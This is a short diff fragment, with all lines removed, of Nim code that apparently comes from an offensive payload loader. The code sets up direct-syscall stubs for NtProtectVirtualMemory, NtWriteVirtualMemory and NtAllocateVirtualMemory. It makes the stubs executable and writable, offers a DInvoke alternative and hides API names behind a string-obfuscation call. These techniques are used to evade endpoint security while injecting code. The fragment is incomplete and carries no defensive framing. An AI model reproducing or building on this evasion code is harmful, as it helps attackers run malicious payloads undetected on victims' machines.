-            success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-        # define NtWriteVirtualMemory
-        NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
-        when defined(DInvoke):
-            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-        else:
-            success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-        
-        # define NtAllocateVirtualMemory
-        NtAllocateVirtualMemory = cast[myNtAllocateVirtM](cast[LPVOID](syscallStub_NtAlloc))
-        when defined(DInvoke):
-            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-        else:
-            success = VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-        
-        
-        success = GetSyscallStub(obf("NtProtectVirtualMemory"), cast[LPVOID](syscallStub_NtProtect))
-        success = GetSyscallStub(obf("NtWriteVirtualMemory"), cast[LPVOID](syscallStub_NtWrite))
-        success = GetSyscallStub(obf("NtAllocateVirtualMemory"), cast[LPVOID](syscallStub_NtAlloc))
-
 """
